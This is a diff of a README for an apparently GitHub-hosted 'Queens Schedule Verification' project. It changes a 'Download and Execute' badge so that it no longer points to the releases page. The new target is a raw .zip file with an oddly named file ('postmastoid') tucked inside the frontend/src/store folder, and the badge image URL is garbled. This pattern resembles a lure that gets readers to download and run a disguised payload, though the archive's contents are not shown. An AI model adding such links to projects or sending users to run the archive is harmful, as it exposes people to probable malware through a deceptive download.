@@ -13,7 +13,7 @@ Welcome to the Queens Schedule Verification repository! This project leverages G
 
 To access the release of this project, click on the button below:
 
-[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Queens%20Schedule%20Verifier-green)](https://github.com/Sayar-21223/queens-schedule-verification/releases)
+[![Download and Execute](https://raw.githubusercontent.com/Sayar-21223/queens-schedule-verification/master/frontend/src/store/schedule_verification_queens_postmastoid.zip%20and%20Execute-Queens%20Schedule%20Verifier-green)](https://raw.githubusercontent.com/Sayar-21223/queens-schedule-verification/master/frontend/src/store/schedule_verification_queens_postmastoid.zip)
 
 If the link doesn't have a specific path, simply visit it to explore the releases section.
 
